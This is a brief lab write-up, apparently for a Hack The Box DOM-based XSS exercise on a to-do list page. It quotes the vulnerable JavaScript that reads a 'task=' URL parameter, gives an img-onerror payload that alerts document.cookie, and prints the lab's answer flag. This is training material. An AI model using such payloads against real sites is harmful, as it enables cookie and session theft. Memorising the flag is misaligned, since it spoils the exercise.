...
![To-Do List with input 'test' and 'Add' button. Next Task: test.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/103/xss_dom_1.jpg)
...
![Network tab instructions: Reload for network activity, click stopwatch for performance analysis.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/103/xss_dom_network.jpg)
...
![HTML inspector showing links to Bootstrap and jQuery, with 'Next Task: test' in a list.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/103/xss_dom_inspector.jpg)
...
```javascript
var pos = document.URL.indexOf("task="); var task = document.URL.substring(pos + 5, document.URL.length);
```
...
Added the below payload

```html
<img src="" onerror=alert(document.cookie)>
```

gives flag `HTB{pur3ly_cl13n7_51d3}`